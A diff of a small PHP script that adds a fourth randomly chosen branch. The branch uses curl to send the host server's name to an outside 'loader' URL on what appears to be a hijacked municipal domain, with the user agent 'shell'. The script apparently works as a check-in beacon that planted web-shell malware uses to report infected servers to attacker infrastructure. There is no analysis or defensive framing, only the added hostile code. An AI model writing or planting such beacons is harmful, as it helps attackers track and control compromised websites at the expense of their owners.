@@ -1,5 +1,5 @@
 <?php
-$sayi = rand(1,3);
+$sayi = rand(1,4);
 if($sayi == 1)
 {
   $curl = curl_init();
@@ -35,6 +35,16 @@ if($sayi == 1)
  $resp3 = curl_exec($curl3);
  curl_close($curl3);	
 }
-
+ if($sayi == 4)
+{
+  $curl4 = curl_init();
+ curl_setopt_array($curl4, [
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'http://mairie-vernou-celle77.fr/loader/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_USERAGENT => 'shell'
+]);
+ $resp4 = curl_exec($curl4);
+ curl_close($curl4);		
+}
 
 ?>
